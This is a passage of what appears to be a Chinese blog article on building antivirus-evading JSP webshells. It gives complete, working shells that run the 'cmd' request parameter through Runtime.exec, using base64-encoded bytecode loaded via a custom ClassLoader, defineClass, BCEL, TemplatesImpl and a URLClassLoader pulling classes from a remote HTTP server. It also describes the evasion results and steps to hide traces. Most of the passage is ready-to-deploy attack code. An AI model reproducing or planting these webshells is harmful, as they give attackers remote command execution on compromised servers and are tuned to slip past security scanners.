package com.demo;import jdk.internal.org.objectweb.asm.ClassWriter;import jdk.internal.org.objectweb.asm.MethodVisitor;import java.util.Base64;import static jdk.internal.org.objectweb.asm.Opcodes.*;public class Demo2 {    public static void main(String[] args){        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_MAXS);        cw.visit(V1_8, ACC_PUBLIC, "Shell", null, "java/lang/Object", null);        MethodVisitor mw = cw.visitMethod(ACC_PUBLIC, "<init>", "()V", null, null);        mw.visitVarInsn(ALOAD, 0);        mw.visitMethodInsn(INVOKESPECIAL, "java/lang/Object", "<init>", "()V",false);        mw.visitInsn(RETURN);        mw.visitMaxs(1, 1);        mw.visitEnd();        MethodVisitor mw2 = cw.visitMethod(ACC_PUBLIC, "runs",                "(Ljava/lang/String;)Ljava/lang/Process;", null, null);        mw2.visitCode();        mw2.visitMethodInsn(INVOKESTATIC, "java/lang/Runtime", "getRuntime",                "()Ljava/lang/Runtime;",false);        mw2.visitVarInsn(ALOAD,1);        mw2.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Runtime", "exec", "(Ljava/lang/String;)Ljava/lang/Process;", false);        mw2.visitInsn(ARETURN);        mw2.visitMaxs(10, 3);        mw2.visitEnd();        byte[] code = cw.toByteArray();        System.out.println(new String(Base64.getEncoder().encode(code)));    \}\}
```

这里由于 ASM 操作比较复杂，就先生成一个简单的字节码 (前面 javac 和 javassist 笔者写的回显都是在字节码这，这 ASM 回显的内容就先不放在 ASM 中生成)，由于 runs 函数的返回值为 Process，我们只需要在后面的 jsp 处理中拿出来用即可。

```
<%@ page import="java.lang.reflect.Constructor" %><%@ page import="java.util.Base64" %><%@ page import="java.security.cert.Certificate" %><%@ page import="java.security.*" %><%@ page import="java.lang.reflect.Method" %><%@ page import="java.io.InputStream" %><%@ page import="java.io.BufferedReader" %><%@ page import="java.io.InputStreamReader" %><%  ClassLoader loader = new ClassLoader() {    @Override    public Class<?> loadClass(String name) throws ClassNotFoundException {      if(name.contains("com.demo.Shell")){        return findClass(name);      }      return super.loadClass(name);    }    @Override    protected Class<?> findClass(String name) throws ClassNotFoundException {      try {        byte[] bytes = Base64.getDecoder().decode("yv66vgAAADQAFQEADmNvbS9kZW1vL1NoZWxsBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEABjxpbml0PgEAAygpVgwABQAGCgAEAAcBAARydW5zAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1J1bnRpbWUHAAsBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAANAA4KAAwADwEABGV4ZWMMABEACgoADAASAQAEQ29kZQABAAIABAAAAAAAAgABAAUABgABABQAAAARAAEAAQAAAAUqtwAIsQAAAAAAAQAJAAoAAQAUAAAAFAAKAAIAAAAIuAAQK7YAE7AAAAAAAAA=");        PermissionCollection pc = new Permissions();        pc.add(new AllPermission());        ProtectionDomain protectionDomain = new ProtectionDomain(new CodeSource(null, (Certificate[]) null), pc, this, null);        return this.defineClass(name, bytes, 0, bytes.length, protectionDomain);      } catch (Exception e) {        e.printStackTrace();      }      return super.findClass(name);    }  };  String cmd = request.getParameter("cmd");  Class<?> shell = loader.loadClass("com.demo.Shell");  Object object =  shell.newInstance();  Method dm = shell.getDeclaredMethod("runs",String.class);  Process o2 = (Process)dm.invoke(object, cmd);  InputStream is = o2.getInputStream();  BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(is));  String r = "";  String s = "";  while((r = bufferedReader.readLine())!=null){    s += r;  }  response.getWriter().println(s);%>
```

免杀修改

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmrayibVuO3KkRGFApr2hFljcicl8r5u7pGCF9UZ6BTCIQkjnecgckv9icicBw/640?wx_fmt=png)18.png![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraNWbgExQ1WiaCpjCAFvA4G2SZ6QblBlmicCdCv3fejBnutwWITZpGfWrA/640?wx_fmt=png)19.png

defindClass 免杀
--------------

```
<%@ page import="java.lang.reflect.Method" %><%@ page import="java.util.Base64" %><%@ page import="java.io.InputStream" %><%@ page import="java.io.FileInputStream" %><%@ page import="java.nio.channels.FileChannel" %><%@ page import="java.nio.ByteBuffer" %><%@ page language="java" pageEncoding="UTF-8" %><%  Method defineClass =          ClassLoader.class.getDeclaredMethod("defineClass", String.class,                  byte[].class, int.class, int.class);  defineClass.setAccessible(true);  byte[] bytes =  Base64.getDecoder().decode("yv66vgAAADQAUAoAEAAtCgAuAC8KAC4AMAoAMQAyBwAzBwA0CgAGADUKAAUANggANwoABQA4BwA5CgALAC0KAAsAOgoACwA7BwA8BwA9AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABBMY29tL2RlbW8vU2hlbGw7AQAEcnVucwEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQAHcHJvY2VzcwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAAJpcwEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEADmJ1ZmZlcmVkUmVhZGVyAQAYTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQABcgEAAXMBAA1TdGFja01hcFRhYmxlBwA+BwA/BwBABwAzAQAKRXhjZXB0aW9ucwcAQQEAClNvdXJjZUZpbGUBAApTaGVsbC5qYXZhDAARABIHAEIMAEMARAwARQBGBwA/DABHAEgBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwAEQBJDAARAEoBAAAMAEsATAEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDABNAE4MAE8ATAEADmNvbS9kZW1vL1NoZWxsAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nACEADwAQAAAAAAACAAEAEQASAAEAEwAAAC8AAQABAAAABSq3AAGxAAAAAgAUAAAABgABAAAACAAVAAAADAABAAAABQAWABcAAAAJABgAGQACABMAAADlAAUABgAAAEu4AAIqtgADTCu2AARNuwAFWbsABlkstwAHtwAIThIJOgQSCToFLbYAClk6BMYAHLsAC1m3AAwZBbYADRkEtgANtgAOOgWn/+AZBbAAAAADABQAAAAiAAgAAAALAAgADAANAA0AHQAOACEADwAlABAALwARAEgAEwAVAAAAPgAGAAAASwAaABsAAAAIAEMAHAAdAAEADQA+AB4AHwACAB0ALgAgACEAAwAhACoAIgAbAAQAJQAmACMAGwAFACQAAAAcAAL/ACUABgcAJQcAJgcAJwcAKAcAJQcAJQAAIgApAAAABAABACoAAQArAAAAAgAs");  Class shell = (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), "com.demo.Shell", bytes, 0, bytes.length);  Object object =  shell.newInstance();  Method dm = shell.getDeclaredMethod("runs",String.class);  Object invoke = dm.invoke(object, "calc");%>
```

免杀效果：

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraImRITbZoGxpZScLBy1PSoFb1ib2Y2SMzWnZrHRH6IxqpMMoib5nSxIiaw/640?wx_fmt=png)1.png![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraibBUBdJKc8hU7dhomwJd4b5Vre4jKI3E56yXusWoR5IoNIjHwTdfoag/640?wx_fmt=png)2.png

虽然用原始的 defindClass 虽然能到达免杀效果，但是由于没有重写 loadClass，findClass，没有打破双亲委派，导致恶意的字节码被加载后，再次访问网页的时候，类不会被生成，导致不能正常使用

自定义 classloader 免杀
------------------

```
<%@ page import="java.lang.reflect.Constructor" %><%@ page import="java.util.Base64" %><%@ page import="java.security.cert.Certificate" %><%@ page import="java.security.*" %><%@ page import="java.lang.reflect.Method" %><%@ page import="java.io.InputStream" %><%@ page import="java.io.BufferedReader" %><%@ page import="java.io.InputStreamReader" %><%  ClassLoader loader = new ClassLoader() {    @Override    public Class<?> loadClass(String name) throws ClassNotFoundException {      if(name.contains("com.demo.Shell")){        return findClass(name);      }      return super.loadClass(name);    }    @Override    protected Class<?> findClass(String name) throws ClassNotFoundException {      try {        byte[] bytes = Base64.getDecoder().decode("yv66vgAAADQAUAoAEAAtCgAuAC8KAC4AMAoAMQAyBwAzBwA0CgAGADUKAAUANggANwoABQA4BwA5CgALAC0KAAsAOgoACwA7BwA8BwA9AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABBMY29tL2RlbW8vU2hlbGw7AQAEcnVucwEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQAHcHJvY2VzcwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAAJpcwEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEADmJ1ZmZlcmVkUmVhZGVyAQAYTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQABcgEAAXMBAA1TdGFja01hcFRhYmxlBwA+BwA/BwBABwAzAQAKRXhjZXB0aW9ucwcAQQEAClNvdXJjZUZpbGUBAApTaGVsbC5qYXZhDAARABIHAEIMAEMARAwARQBGBwA/DABHAEgBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwAEQBJDAARAEoBAAAMAEsATAEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDABNAE4MAE8ATAEADmNvbS9kZW1vL1NoZWxsAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nACEADwAQAAAAAAACAAEAEQASAAEAEwAAAC8AAQABAAAABSq3AAGxAAAAAgAUAAAABgABAAAACAAVAAAADAABAAAABQAWABcAAAAJABgAGQACABMAAADlAAUABgAAAEu4AAIqtgADTCu2AARNuwAFWbsABlkstwAHtwAIThIJOgQSCToFLbYAClk6BMYAHLsAC1m3AAwZBbYADRkEtgANtgAOOgWn/+AZBbAAAAADABQAAAAiAAgAAAALAAgADAANAA0AHQAOACEADwAlABAALwARAEgAEwAVAAAAPgAGAAAASwAaABsAAAAIAEMAHAAdAAEADQA+AB4AHwACAB0ALgAgACEAAwAhACoAIgAbAAQAJQAmACMAGwAFACQAAAAcAAL/ACUABgcAJQcAJgcAJwcAKAcAJQcAJQAAIgApAAAABAABACoAAQArAAAAAgAs");        PermissionCollection pc = new Permissions();        pc.add(new AllPermission());        ProtectionDomain protectionDomain = new ProtectionDomain(new CodeSource(null, (Certificate[]) null), pc, this, null);        return this.defineClass(name, bytes, 0, bytes.length, protectionDomain);      } catch (Exception e) {        e.printStackTrace();      }      return super.findClass(name);    }  };  String cmd = request.getParameter("cmd");  Class<?> shell = loader.loadClass("com.demo.Shell");  Object object =  shell.newInstance();  Method dm = shell.getDeclaredMethod("runs",String.class);  response.getWriter().println(dm.invoke(object, cmd));%>
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraachSrwtSy8eexXQ2Rn6wkibiaIXaFBdZwibT3beaNOGiawW1ZpiaUonCiaEg/640?wx_fmt=png)3.png

免杀效果：

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0Jywxmrao6ao5ETWo7l96xLstKMdtplwUTYjib9QHx2JpWMQSjficNWkaAm0dong/640?wx_fmt=png)4.png![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmrajIPJL3FIhtbO6L0sYLOVyOcsaxLu8q3fgNQWvLofxOrvokNCibHibiadA/640?wx_fmt=png)5.png

BCEL 字节码免杀
----------

Apache Commons BCEL 被包含在了 JDK 的原生库中，BCEL 库提供了一系列用于分析、创建、修改 Java Class 文件的 API 用于处理字节码，但是 com.sun.org.apache.bcel.internal.util.ClassLoader 这个类加载器由于安全问题，在 JDK7 以上版本被移除，导致 BCEL 字节码的利用变得很局限。

```
<%@ page import="java.lang.reflect.Method" %><%@ page import="com.sun.org.apache.xml.internal.security.utils.Base64" %><%@ page import="com.sun.org.apache.bcel.internal.classfile.Utility" %><%  byte[] bytes =  Base64.decode("yv66vgAAADQAUAoAEAAtCgAuAC8KAC4AMAoAMQAyBwAzBwA0CgAGADUKAAUANggANwoABQA4BwA5CgALAC0KAAsAOgoACwA7BwA8BwA9AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABBMY29tL2RlbW8vU2hlbGw7AQAEcnVucwEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQAHcHJvY2VzcwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAAJpcwEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEADmJ1ZmZlcmVkUmVhZGVyAQAYTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQABcgEAAXMBAA1TdGFja01hcFRhYmxlBwA+BwA/BwBABwAzAQAKRXhjZXB0aW9ucwcAQQEAClNvdXJjZUZpbGUBAApTaGVsbC5qYXZhDAARABIHAEIMAEMARAwARQBGBwA/DABHAEgBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwAEQBJDAARAEoBAAAMAEsATAEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDABNAE4MAE8ATAEADmNvbS9kZW1vL1NoZWxsAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nACEADwAQAAAAAAACAAEAEQASAAEAEwAAAC8AAQABAAAABSq3AAGxAAAAAgAUAAAABgABAAAACAAVAAAADAABAAAABQAWABcAAAAJABgAGQACABMAAADlAAUABgAAAEu4AAIqtgADTCu2AARNuwAFWbsABlkstwAHtwAIThIJOgQSCToFLbYAClk6BMYAHLsAC1m3AAwZBbYADRkEtgANtgAOOgWn/+AZBbAAAAADABQAAAAiAAgAAAALAAgADAANAA0AHQAOACEADwAlABAALwARAEgAEwAVAAAAPgAGAAAASwAaABsAAAAIAEMAHAAdAAEADQA+AB4AHwACAB0ALgAgACEAAwAhACoAIgAbAAQAJQAmACMAGwAFACQAAAAcAAL/ACUABgcAJQcAJgcAJwcAKAcAJQcAJQAAIgApAAAABAABACoAAQArAAAAAgAs");  String code = Utility.encode(bytes, true);  String bcelCode = "$$BCEL$$" + code;  com.sun.org.apache.bcel.internal.util.ClassLoader bcelClassLoader = new com.sun.org.apache.bcel.internal.util.ClassLoader();  Class<?> shell = bcelClassLoader.loadClass(bcelCode);  Object object = shell.newInstance();  Method dm = shell.getDeclaredMethod("runs",String.class);  String cmd = request.getParameter("cmd");  response.getWriter().println(dm.invoke(object, cmd));%>
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0Jywxmra8UnKaGSryZNq7qgD0j5zfY4B81Q0Jq139GFxpZicKHnEmFibAAr18hpg/640?wx_fmt=png)6.png![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraR4NLBx161v9wUtHHfxDAP7UmiaoKTb7lgzp2hNARDEwlpeZX639wtEw/640?wx_fmt=png)7.png

### TemplatesImpl 加载字节码

TemplatesImpl 是 fastjson 反序列化漏洞中常用的对象之一，但是由于在 TemplatesImpl 触发漏洞点只是调用个无参构造，导致恶意类的类方法无法被调用，只能将恶意代码插入到无参构造方法，或者静态代码块中。

```
package com.demo;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.BufferedReader;import java.io.IOException;import java.io.InputStream;import java.io.InputStreamReader;public class Shell extends AbstractTranslet {    static {        try {            Runtime.getRuntime().exec("calc");        } catch (IOException e) {            e.printStackTrace();        }    }    @Override    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {    }    @Override    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {    \}\}
```

注意：

这里的类必须继承自 AbstractTranslet

```
<%@ page import="java.util.Base64" %><%@ page import="java.lang.reflect.Field" %><%@ page import="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl" %><%@ page import="com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl" %><%  class Demo {    private void setFiledValue(Object obj, String fieldName, Object fieldValue) throws Exception {      Field field = obj.getClass().getDeclaredField(fieldName);      field.setAccessible(true);      field.set(obj, fieldValue);    }    public Demo(String s) {      try {        byte[] codes = Base64.getDecoder().decode(s);        byte[][] _bytecodes = new byte[][] {                codes,        };        TemplatesImpl templates = new TemplatesImpl();        setFiledValue(templates, "_bytecodes", _bytecodes);        setFiledValue(templates, "_name", "whatever");        setFiledValue(templates, "_tfactory", new TransformerFactoryImpl());        templates.newTransformer();      } catch (Exception e) {        e.printStackTrace();      }    }  }  new Demo("yv66vgAAADQAZgoAEwA/CgBAAEEKAEAAQgoAQwBEBwBFBwBGCgAGAEcKAAUASAgASQoABQBKBwBLCgALAD8KAAsATAoACwBNCABOBwBPCgAQAFAHAFEHAFIBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEExjb20vZGVtby9TaGVsbDsBAARydW5zAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAANjbWQBABJMamF2YS9sYW5nL1N0cmluZzsBAAdwcm9jZXNzAQATTGphdmEvbGFuZy9Qcm9jZXNzOwEAAmlzAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQAOYnVmZmVyZWRSZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAAFyAQABcwEADVN0YWNrTWFwVGFibGUHAFMHAFQHAFUHAEUBAApFeGNlcHRpb25zAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcAVgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247BwBPAQAKU291cmNlRmlsZQEAClNoZWxsLmphdmEMABQAFQcAVwwAWABZDABaAFsHAFQMAFwAXQEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyDAAUAF4MABQAXwEAAAwAYABhAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAGIAYwwAZABhAQAEY2FsYwEAE2phdmEvaW8vSU9FeGNlcHRpb24MAGUAFQEADmNvbS9kZW1vL1NoZWxsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAEGphdmEvbGFuZy9TdHJpbmcBABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAhyZWFkTGluZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBAA9wcmludFN0YWNrVHJhY2UAIQASABMAAAAAAAUAAQAUABUAAQAWAAAALwABAAEAAAAFKrcAAbEAAAACABcAAAAGAAEAAAAOABgAAAAMAAEAAAAFABkAGgAAAAkAGwAcAAIAFgAAAOUABQAGAAAAS7gAAiq2AANMK7YABE27AAVZuwAGWSy3AAe3AAhOEgk6BBIJOgUttgAKWToExgAcuwALWbcADBkFtgANGQS2AA22AA46Baf/4BkFsAAAAAMAFwAAACIACAAAABcACAAYAA0AGQAdABoAIQAbACUAHAAvAB0ASAAfABgAAAA+AAYAAABLAB0AHgAAAAgAQwAfACAAAQANAD4AIQAiAAIAHQAuACMAJAADACEAKgAlAB4ABAAlACYAJgAeAAUAJwAAABwAAv8AJQAGBwAoBwApBwAqBwArBwAoBwAoAAAiACwAAAAEAAEAEAABAC0ALgACABYAAAA/AAAAAwAAAAGxAAAAAgAXAAAABgABAAAAJQAYAAAAIAADAAAAAQAZABoAAAAAAAEALwAwAAEAAAABADEAMgACACwAAAAEAAEAMwABAC0ANAACABYAAABJAAAABAAAAAGxAAAAAgAXAAAABgABAAAAKgAYAAAAKgAEAAAAAQAZABoAAAAAAAEALwAwAAEAAAABADUANgACAAAAAQA3ADgAAwAsAAAABAABADMACAA5ABUAAQAWAAAAYQACAAEAAAASuAACEg+2AANXpwAISyq2ABGxAAEAAAAJAAwAEAADABcAAAAWAAUAAAARAAkAFAAMABIADQATABEAFQAYAAAADAABAA0ABAA6ADsAAAAnAAAABwACTAcAPAQAAQA9AAAAAgA+");%>
```

在这里由于不能调用恶意类的类方法和有参构造，导致无法动态的执行命令，虽然如此但依旧可能利用 ASM，javassist 这些字节码框架来动态生成恶意类，进行动态的调用命令，在本文先不在探讨如何利用， 利用的方式将会在后期文章中讲解。

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraosqobKlW573JEtjXRJZFOZ4QKkoIuARNMHibLHCy0Anc6aTgcy4FSBQ/640?wx_fmt=png)8.png![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraJ9C0cwvKUcyyicloV61lsKtFdujialKqXyv6v3lwof9Fian4LTSmjE1vQ/640?wx_fmt=png)9.png

URLClassLoader 本地加载
-------------------

URLClassLoader 一般有两种利用方式，一种是远程加载 class 文件，一种是本地加载 class 文件。

### 远程加载 class 文件免杀：

直接利用远程在家 class 文件的好处是代码量少，特征少。但是由于需要一个外网主机作为服务器，远程可能存在着被溯源的可能性。

```
<%@ page import="java.net.URL" %><%@ page import="java.net.URLClassLoader" %><%@ page import="java.lang.reflect.Method" %><%  String cmd = request.getParameter("cmd");  URL url = new URL("http://127.0.0.1:8000/");  URLClassLoader classLoader = new URLClassLoader(new URL[]{url});  System.out.println("父类加载器：" + classLoader.getParent()); // 默认父类加载器是系统类加载器  Class shell = classLoader.loadClass("com.demo.Shell");  Object object =  shell.newInstance();  Method dm = shell.getDeclaredMethod("runs",String.class);  Object invoke = dm.invoke(object, cmd);  response.getWriter().println(invoke);%>
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraDsIZrgoNbSqTiaHt78RLyzMib8O9tibGmdk8qlTVHS3aN6blQicb0s9MBQ/640?wx_fmt=png)10.png

这里讲解一下服务端如何搭建：

第一步：在一个文件夹中使用 python 开启一个 http 服务

python -m http.server

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraNicIJ9Ha4uNzBnKIPZUbS9icfAPiaXhzo1RTibyKHwCGJTnpzbOgfnyjtA/640?wx_fmt=png)11.png

第二步：将编译好的 class 文件，根据全限定类名创建相应的文件夹，并导入 class 文件

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmrakHUunCDtgEHBNP23elcMibFxFcT4LEedcNPtGwMuic7nyKHTicndP7HDg/640?wx_fmt=png)12.png

以上两步即可完成搭建

免杀效果：

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0Jywxmra372ib63nQXgB1l2ND5ficWCUTKmibCdsd0r7aE0of3d93mPnRicB49uXhw/640?wx_fmt=png)13.png![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0Jywxmra9xOjA7LfeI6g7hbBAyibcicfxvw1w0qgVtAfbJFAyMkJic40KTQBFng8g/640?wx_fmt=png)14.png

### JavaCompiler 本地 class 文件免杀：

该免杀方式为先写入一个 java 马，利用 JavaCompiler 将其在 jvm 运行时编译成 class 文件，及 javac 动态编译，在利用 urlclassloader 加载编译好的 class 文件，为了消除特征以下的 base64 编码的内容就是之前写好的 webshell 代码。由于这种方式会创建 java，class 文件，为了隐蔽性，在这里将删除的文件在进行了删除处理。

```
